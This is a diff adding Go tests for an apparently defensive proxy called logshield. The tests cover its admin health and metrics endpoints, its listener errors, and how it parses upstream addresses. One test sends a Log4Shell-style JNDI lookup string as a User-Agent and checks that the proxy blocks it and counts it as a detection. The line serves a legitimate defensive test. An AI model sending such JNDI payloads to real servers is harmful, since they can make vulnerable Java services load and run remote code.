@@ -3,9 +3,12 @@ package main
 import (
 	"bytes"
 	"context"
+	"encoding/json"
 	"io"
+	"net"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"sync"
 	"testing"
@@ -141,5 +144,103 @@ func TestMonitorModeAnnouncesItself(t *testing.T) {
 	}
 	if !strings.Contains(errb.String(), "monitor mode") {
 		t.Errorf("no monitor-mode notice:\n%s", errb.String())
+	}
+}
+
+// Metrics and health endpoints work end to end and shutdown drains cleanly.
+func TestAdminEndpoints(t *testing.T) {
+	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") }))
+	defer up.Close()
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	addrc := make(chan string, 1)
+	errb := &syncBuffer{}
+	done := make(chan int, 1)
+	go func() {
+		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-admin-listen", "127.0.0.1:0", "-max-in-flight", "8"},
+			io.Discard, errb, func(a string) { addrc <- a })
+	}()
+	addr := <-addrc
+
+	do := func(url, ua string) (int, string) {
+		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)
+		if ua != "" {
+			req.Header.Set("User-Agent", ua)
+		}
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
+		defer func() { _ = resp.Body.Close() }()
+		b, _ := io.ReadAll(resp.Body)
+		return resp.StatusCode, string(b)
+	}
+	do("http://"+addr+"/", "curl/8")
+	do("http://"+addr+"/", "${jndi:ldap://x.invalid/a}")
+
+	// The admin address is announced in the log (the port was chosen by the OS).
+	var admin string
+	for _, line := range strings.Split(errb.String(), "\n") {
+		if strings.Contains(line, `"msg":"admin endpoints"`) {
+			var rec struct{ Addr string }
+			_ = json.Unmarshal([]byte(line), &rec)
+			admin = rec.Addr
+		}
+	}
+	if admin == "" {
+		t.Fatalf("admin address not logged:\n%s", errb.String())
+	}
+	if code, _ := do("http://"+admin+"/healthz", ""); code != 200 {
+		t.Errorf("healthz %d", code)
+	}
+	if code, _ := do("http://"+admin+"/readyz", ""); code != 200 {
+		t.Errorf("readyz %d", code)
+	}
+	_, metrics := do("http://"+admin+"/metrics", "")
+	for _, want := range []string{
+		`logshield_requests_total{action="forwarded",decision="clean",mode="block"} 1`,
+		`logshield_requests_total{action="blocked",decision="malicious",mode="block"} 1`,
+		`logshield_rule_detections_total{rule="LSH-1001"} 1`,
+	} {
+		if !strings.Contains(metrics, want) {
+			t.Errorf("metrics missing %q", want)
+		}
+	}
+	// Admin paths are not reachable through the proxy port.
+	if _, body := do("http://"+addr+"/metrics", ""); strings.Contains(body, "logshield_") {
+		t.Error("metrics leaked through the proxy port")
+	}
+
+	cancel()
+	if code := <-done; code != 0 {
+		t.Errorf("exit %d: %s", code, errb.String())
+	}
+}
+
+func TestAdminListenerErrorIsReported(t *testing.T) {
+	var lc net.ListenConfig
+	busy, err := lc.Listen(context.Background(), "tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = busy.Close() }()
+	errb := &syncBuffer{}
+	code := run(context.Background(), []string{"-listen", "127.0.0.1:0", "-upstream", "http://127.0.0.1:1", "-admin-listen", busy.Addr().String()}, io.Discard, errb, nil)
+	if code != 1 || !strings.Contains(errb.String(), "admin listener") {
+		t.Errorf("exit %d: %s", code, errb.String())
+	}
+}
+
+func TestUpstreamAddr(t *testing.T) {
+	for in, want := range map[string]string{
+		"http://a.example:8080": "a.example:8080",
+		"http://a.example":      "a.example:80",
+		"https://a.example":     "a.example:443",
+		"https://[::1]":         "[::1]:443",
+	} {
+		u, _ := url.Parse(in)
+		if got := upstreamAddr(u); got != want {
+			t.Errorf("%s -> %s, want %s", in, got, want)
+		}
 	}
 }
